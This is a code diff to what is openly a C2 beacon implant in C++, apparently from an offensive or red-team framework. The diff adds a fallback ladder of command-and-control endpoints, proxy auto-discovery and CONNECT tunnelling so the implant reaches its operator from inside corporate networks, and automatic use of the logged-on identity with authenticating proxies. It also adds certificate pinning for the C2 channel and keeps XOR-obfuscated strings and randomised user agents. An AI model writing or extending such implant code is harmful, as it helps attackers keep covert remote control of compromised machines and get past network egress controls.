@@ -77,6 +77,51 @@ static constexpr bool kUseHttps = C2_USE_HTTPS != 0;
 static constexpr bool kUseHttps = true;
 #endif
 
+// ── endpoint ladder / proxy posture ────────────────────────────────────────
+//
+// `C2_HOSTS` is the comma-separated FALLBACK ladder (empty when the operator
+// compiled a single endpoint) and `C2_PROXY` is an explicit proxy URL. Both
+// are optional defines so an older c2_config.h still compiles.
+#ifndef C2_HOSTS
+#define C2_HOSTS ""
+#endif
+#ifndef C2_PROXY
+#define C2_PROXY ""
+#endif
+
+// The pinned C2 certificate fingerprint, when the build provides one. Pinning
+// is enforced whenever it is present, independently of mTLS: a beacon that
+// accepts ANY server certificate over TLS has no transport authentication at
+// all (the payload is encrypted end-to-end, but the peer is unauthenticated).
+#if defined(BEACON_SERVER_FINGERPRINT)
+#define BEACON_PIN_ENFORCED 1
+#else
+#define BEACON_PIN_ENFORCED 0
+#endif
+
+// The pin callback is needed by the pin AND by the mTLS path (which installs
+// it as its verifier), so it is compiled whenever either is active.
+#if BEACON_PIN_ENFORCED || BEACON_MTLS_ENABLED
+#define BEACON_VERIFY_CALLBACK 1
+#else
+#define BEACON_VERIFY_CALLBACK 0
+#endif
+
+inline std::vector<std::string> split_csv(const char* raw) {
+    std::vector<std::string> out;
+    std::string current;
+    for (const char* p = raw; p && *p; ++p) {
+        if (*p == ',') {
+            if (!current.empty()) out.push_back(current);
+            current.clear();
+        } else if (*p != ' ' && *p != '"') {
+            current.push_back(*p);
+        }
+    }
+    if (!current.empty()) out.push_back(current);
+    return out;
+}
+
 struct C2Config {
 #ifdef _WIN32
     std::wstring host      = XOR_WDEC(XOR_WSTR(L"127.0.0.1")).c_str();
@@ -84,6 +129,74 @@ struct C2Config {
     std::string  host      = XOR_DEC(XOR_STR("127.0.0.1")).c_str();
 #endif
     int          port      = 8443;
+    // ── the ladder ─────────────────────────────────────────────────────
+    // A single compiled-in endpoint is a single point of failure: one
+    // filtered address, one taken-down redirector, one provider outage ends
+    // the engagement. `ladder` holds the primary plus every fallback and
+    // `failover()` walks it; `failures_here` counts consecutive check-ins
+    // that died on the CURRENT endpoint, so a flapping network does not
+    // burn the whole ladder in three seconds.
+    std::vector<std::string> ladder;
+    size_t       ladder_index = 0;
+    int          failures_here = 0;
+    int          failover_after = 3;
+    // explicit proxy URL ("" = let the OS/proxy layer decide)
+    std::string  proxy;
+
+    void apply_endpoint() {
+        std::string endpoint = ladder.empty() ? std::string("127.0.0.1")
+                                              : ladder[ladder_index];
+#ifdef _WIN32
+        host = std::wstring(endpoint.begin(), endpoint.end());
+#else
+        host = endpoint;
+#endif
+    }
+
+    // Seed the ladder from the compiled-in primary + fallbacks, then point
+    // `host` at the first rung.
+    void seed_ladder(const std::string& primary, const std::string& fallbacks) {
+        ladder.clear();
+        if (!primary.empty()) ladder.push_back(primary);
+        for (const std::string& extra : split_csv(fallbacks.c_str())) {
+            if (!extra.empty() &&
+                std::find(ladder.begin(), ladder.end(), extra) == ladder.end()) {
+                ladder.push_back(extra);
+            }
+        }
+        ladder_index = 0;
+        failures_here = 0;
+        apply_endpoint();
+    }
+
+    // Operator override (argv): the named endpoint becomes the FIRST rung,
+    // without discarding the compiled-in ladder behind it.
+    void prefer_endpoint(const std::string& endpoint) {
+        if (endpoint.empty()) return;
+        ladder.erase(std::remove(ladder.begin(), ladder.end(), endpoint),
+                     ladder.end());
+        ladder.insert(ladder.begin(), endpoint);
+        ladder_index = 0;
+        failures_here = 0;
+        apply_endpoint();
+    }
+
+    const std::string endpoint() const {
+        return ladder.empty() ? std::string("127.0.0.1") : ladder[ladder_index];
+    }
+
+    // One failed check-in on the current endpoint. Returns true when the
+    // ladder MOVED (the caller should drop any cached connection state).
+    bool on_failure() {
+        if (ladder.size() < 2) return false;
+        if (++failures_here < failover_after) return false;
+        ladder_index = (ladder_index + 1) % ladder.size();
+        failures_here = 0;
+        apply_endpoint();
+        return true;
+    }
+
+    void on_success() { failures_here = 0; }
     bool         use_https = kUseHttps;
     int          sleep_ms  = 5000;   // live cadence (may be raised by outage backoff)
     int          base_sleep_ms = 5000; // operator-configured base, restored after outages
@@ -142,11 +255,47 @@ inline bool WinHttpContext::ensure(const C2Config& cfg) {
     if (hSession) { winhttp_dyn::WinHttpCloseHandleDynamic(hSession); hSession = nullptr; }
     
     std::wstring ua = get_random_ua();
+    // ── proxy posture ─────────────────────────────────────────────────
+    // `WINHTTP_ACCESS_TYPE_NO_PROXY` was a silent deployment killer: on a
+    // managed endpoint the proxy is usually the ONLY egress path (PAC/WPAD
+    // or an explicit proxy), so a beacon that ignores it simply never calls
+    // home and the foothold looks like a failed payload. Order:
+    //   1. AUTOMATIC_PROXY  — resolves PAC/WPAD/「system proxy」exactly like
+    //      the browser, which is the only path that works unconfigured;
+    //   2. the explicit proxy compiled into the build (C2_PROXY), which wins
+    //      over auto-discovery when the operator set one;
+    //   3. the platform default, as a last resort.
+#ifndef WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY
+#define WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY 4
+#endif
     hSession = winhttp_dyn::WinHttpOpenDynamic(
         ua.c_str(),
-        WINHTTP_ACCESS_TYPE_NO_PROXY,
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        hSession = winhttp_dyn::WinHttpOpenDynamic(
+            ua.c_str(),
+            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+            WINHTTP_NO_PROXY_NAME,
+            WINHTTP_NO_PROXY_BYPASS, 0);
+    }
+    if (hSession && !cfg.proxy.empty()) {
+        std::wstring wproxy(cfg.proxy.begin(), cfg.proxy.end());
+        std::wstring bypass(L"<local>");
+        WINHTTP_PROXY_INFO proxy_info{};
+        proxy_info.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+        proxy_info.lpszProxy = const_cast<wchar_t*>(wproxy.c_str());
+        proxy_info.lpszProxyBypass = const_cast<wchar_t*>(bypass.c_str());
+        winhttp_dyn::WinHttpSetOptionDynamic(
+            hSession, WINHTTP_OPTION_PROXY, &proxy_info, sizeof(proxy_info));
+        // An authenticating proxy needs the logged-on identity; the policy
+        // is only relaxed when the operator explicitly configured a proxy.
+        DWORD autologon = WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW;
+        winhttp_dyn::WinHttpSetOptionDynamic(
+            hSession, WINHTTP_OPTION_AUTOLOGON_POLICY, &autologon,
+            sizeof(autologon));
+    }
     
     if (hSession) {
         hConnect = winhttp_dyn::WinHttpConnectDynamic(
@@ -371,7 +520,12 @@ bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
         winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
         return "";
     }
-#if BEACON_MTLS_ENABLED
+    // ── certificate pinning (independent of mTLS) ─────────────────────
+    // The security flags above still tolerate an unknown CA because the C2
+    // usually presents a self-signed certificate; the PIN is what actually
+    // authenticates the peer. Enforced whenever the build carries a
+    // fingerprint, so a default build is no longer "TLS to anyone".
+#if BEACON_PIN_ENFORCED
     PCCERT_CONTEXT peer_cert = nullptr;
     DWORD peer_size = sizeof(peer_cert);
     bool pin_ok = winhttp_dyn::WinHttpQueryOptionDynamic(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
@@ -387,8 +541,10 @@ bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
     }
     if (peer_cert) CertFreeCertificateContext(peer_cert);
     if (!pin_ok) {
+#if BEACON_MTLS_ENABLED
         if (client_cert) CertFreeCertificateContext(client_cert);
         if (client_store) CertCloseStore(client_store, 0);
+#endif
         g_ctx.cleanup();
         winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
         return "";
@@ -475,6 +631,13 @@ inline std::string http_request(
 
     curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+
+    // Proxy: libcurl reads the environment on its own, which is usually the
+    // right answer (the operator's shell already has http(s)_proxy set). An
+    // explicitly compiled-in proxy takes precedence.
+    if (!cfg.proxy.empty()) {
+        curl_easy_setopt(curl, CURLOPT_PROXY, cfg.proxy.c_str());
+    }
 
     struct curl_slist *headers = NULL;
 #if BEACON_AUTH_ENABLED
@@ -564,9 +727,151 @@ inline bool connect_with_timeout(int sock, const sockaddr* address,
     return true;
 }
 
-#if BEACON_MTLS_ENABLED
+// ── proxy + dialing (Linux/macOS/Android) ─────────────────────────────────
+//
+// A raw-socket beacon that ignores the proxy is unreachable in every
+// corporate network: the proxy is the only egress. Same order as the Windows
+// path — explicit config first, then the environment the operator's shell
+// already uses — and the tunnel is a plain CONNECT, which is what a browser
+// does for an https:// URL.
+
+struct ProxyEndpoint {
+    std::string host;
+    int port = 0;
+    bool valid = false;
+};
+
+inline std::string trim_spaces(const std::string& value) {
+    size_t first = value.find_first_not_of(" \t\r\n");
+    if (first == std::string::npos) return "";
+    size_t last = value.find_last_not_of(" \t\r\n");
+    return value.substr(first, last - first + 1);
+}
+
+inline ProxyEndpoint parse_proxy(const std::string& url) {
+    ProxyEndpoint out;
+    std::string s = trim_spaces(url);
+    size_t scheme = s.find("://");
+    if (scheme != std::string::npos) s = s.substr(scheme + 3);
+    size_t at = s.find('@');            // drop user[:pass]@
+    if (at != std::string::npos) s = s.substr(at + 1);
+    size_t slash = s.find('/');
+    if (slash != std::string::npos) s = s.substr(0, slash);
+    if (s.empty()) return out;
+    size_t colon = s.rfind(':');
+    if (colon == std::string::npos || colon == 0) {
+        out.host = s;
+        out.port = 3128;                 // conventional HTTP-proxy port
+    } else {
+        out.host = s.substr(0, colon);
+        try {
+            out.port = std::stoi(s.substr(colon + 1));
+        } catch (...) {
+            out.port = 3128;
+        }
+    }
+    out.valid = !out.host.empty() && out.port > 0 && out.port < 65536;
+    return out;
+}
+
+inline std::string proxy_from_env() {
+    const char* names[] = {"https_proxy", "HTTPS_PROXY", "all_proxy",
+                           "ALL_PROXY", "http_proxy", "HTTP_PROXY"};
+    for (const char* name : names) {
+        const char* value = getenv(name);
+        if (value && *value) return std::string(value);
+    }
+    return "";
+}
+
+inline bool proxy_bypassed(const std::string& host) {
+    const char* raw = getenv("no_proxy");
+    if (!raw || !*raw) raw = getenv("NO_PROXY");
+    if (!raw || !*raw) return false;
+    std::string list(raw);
+    size_t start = 0;
+    while (start <= list.size()) {
+        size_t comma = list.find(',', start);
+        std::string entry = trim_spaces(list.substr(
+            start, comma == std::string::npos ? std::string::npos : comma - start));
+        if (entry == "*") return true;
+        if (!entry.empty() && entry.size() <= host.size() &&
+            host.compare(host.size() - entry.size(), entry.size(), entry) == 0) {
+            return true;
+        }
+        if (comma == std::string::npos) break;
+        start = comma + 1;
+    }
+    return false;
+}
+
+// Resolve + connect, trying every address getaddrinfo returns (IPv6 first
+// when the host has one): the old `gethostbyname` was IPv4-only, so an
+// IPv6-only or dual-stack C2 was simply unreachable.
+inline int dial_tcp(const std::string& host, int port) {
+    struct addrinfo hints{};
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    struct addrinfo* resolved = nullptr;
+    std::string port_str = std::to_string(port);
+    if (getaddrinfo(host.c_str(), port_str.c_str(), &hints, &resolved) != 0 ||
+        resolved == nullptr) {
+        return -1;
+    }
+    int sock = -1;
+    for (struct addrinfo* ai = resolved; ai != nullptr; ai = ai->ai_next) {
+        int candidate = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
+        if (candidate < 0) continue;
+        timeval io_timeout{15, 0};
+        setsockopt(candidate, SOL_SOCKET, SO_RCVTIMEO, &io_timeout, sizeof(io_timeout));
+        setsockopt(candidate, SOL_SOCKET, SO_SNDTIMEO, &io_timeout, sizeof(io_timeout));
+        if (connect_with_timeout(candidate, ai->ai_addr,
+                                 (socklen_t)ai->ai_addrlen, 15)) {
+            sock = candidate;
+            break;
+        }
+        close(candidate);
+    }
+    freeaddrinfo(resolved);
+    return sock;
+}
+
+// HTTP CONNECT tunnel: what a browser does for an https:// URL behind a
+// proxy. "200" in the status line is the only acceptance.
+inline bool proxy_tunnel(int sock, const std::string& host, int port) {
+    std::string target = host + ":" + std::to_string(port);
+    std::string request = "CONNECT " + target + " HTTP/1.1\r\n"
+                          "Host: " + target + "\r\n"
+                          "Proxy-Connection: keep-alive\r\n\r\n";
+    size_t sent = 0;
+    while (sent < request.size()) {
+        int written = (int)send(sock, request.data() + sent,
+                                request.size() - sent, 0);
+        if (written <= 0) return false;
+        sent += (size_t)written;
+    }
+    std::string response;
+    char buffer[512];
+    while (response.find("\r\n\r\n") == std::string::npos && response.size() < 4096) {
+        int got = (int)recv(sock, buffer, sizeof(buffer), 0);
+        if (got <= 0) break;
+        response.append(buffer, (size_t)got);
+    }
+    return response.find(" 200") != std::string::npos;
+}
+
+#if BEACON_VERIFY_CALLBACK
+// PIN-FIRST verification.
+//
+// The old callback rejected the connection whenever `preverify_ok` was false,
+// which made it useless against the deployment it was written for: the C2
+// presents a SELF-SIGNED certificate, so the chain check always failed and
+// the pin could never be reached. Now the leaf fingerprint IS the decision:
+// a mismatch is a hard failure no matter what the (absent) chain said, a
+// match is accepted, and only the leaf (depth 0) is judged — intermediates
+// are the C2's business.
 inline int verify_server_pin(int preverify_ok, X509_STORE_CTX* store_ctx) {
-    if (!preverify_ok) return 0;
+    (void)preverify_ok;
     if (X509_STORE_CTX_get_error_depth(store_ctx) != 0) return 1;
     X509* certificate = X509_STORE_CTX_get_current_cert(store_ctx);
     if (!certificate) return 0;
@@ -575,7 +880,9 @@ inline int verify_server_pin(int preverify_ok, X509_STORE_CTX* store_ctx) {
     if (X509_digest(certificate, EVP_sha256(), digest, &digest_len) != 1) return 0;
     return crypto::hex_encode(digest, digest_len) == BEACON_SERVER_FINGERPRINT;
 }
+#endif
 
+#if BEACON_MTLS_ENABLED
 inline bool configure_mtls(SSL_CTX* ssl_ctx) {
     BIO* ca_bio = BIO_new_mem_buf(BEACON_CLIENT_CA_PEM, -1);
     X509* ca_cert = ca_bio ? PEM_read_bio_X509(ca_bio, nullptr, nullptr, nullptr) : nullptr;
@@ -617,20 +924,23 @@ inline std::string http_request(
     std::string path_narrow(path.begin(), path.end());
     std::string method_narrow(method.begin(), method.end());
 
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    // The peer we DIAL may be a proxy while the peer we SPEAK TO is the C2:
+    // resolve the egress first (config, then the environment), tunnel to the
+    // target, then run TLS end-to-end over the tunnel.
+    std::string proxy_url = cfg.proxy.empty() ? proxy_from_env() : cfg.proxy;
+    ProxyEndpoint proxy;
+    if (!proxy_url.empty() && !proxy_bypassed(host_narrow)) {
+        proxy = parse_proxy(proxy_url);
+    }
+    std::string dial_host = proxy.valid ? proxy.host : host_narrow;
+    int dial_port = proxy.valid ? proxy.port : cfg.port;
+
+    int sock = dial_tcp(dial_host, dial_port);
     if (sock < 0) return "";
-    timeval io_timeout{15, 0};
-    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &io_timeout, sizeof(io_timeout));
-    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &io_timeout, sizeof(io_timeout));
-
-    struct hostent *server = gethostbyname(host_narrow.c_str());
-    if (!server) { close(sock); return ""; }
-
-    struct sockaddr_in addr;
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
-    addr.sin_port = htons(static_cast<uint16_t>(cfg.port));
+    if (proxy.valid && !proxy_tunnel(sock, host_narrow, cfg.port)) {
+        close(sock);
+        return "";
+    }
 
     SSL_CTX *ssl_ctx = nullptr;
     SSL *ssl = nullptr;
@@ -646,6 +956,13 @@ inline std::string http_request(
                 return "";
             }
 #endif
+#if BEACON_PIN_ENFORCED
+            // Without mTLS nothing verified the peer at all: a default build
+            // would complete a TLS handshake with ANY server. Pin-first
+            // verification makes the leaf fingerprint the decision, which is
+            // the only check that works against a self-signed C2.
+            SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_PEER, verify_server_pin);
+#endif
             ssl = SSL_new(ssl_ctx);
             if (!ssl) {
                 SSL_CTX_free(ssl_ctx);
@@ -655,13 +972,6 @@ inline std::string http_request(
             SSL_set_tlsext_host_name(ssl, host_narrow.c_str());
             SSL_set_fd(ssl, sock);
         }
-    }
-
-    if (!connect_with_timeout(sock, (struct sockaddr*)&addr, sizeof(addr), 15)) {
-        if (ssl) SSL_free(ssl);
-        if (ssl_ctx) SSL_CTX_free(ssl_ctx);
-        close(sock);
-        return "";
     }
 
     if (ssl && SSL_connect(ssl) <= 0) {
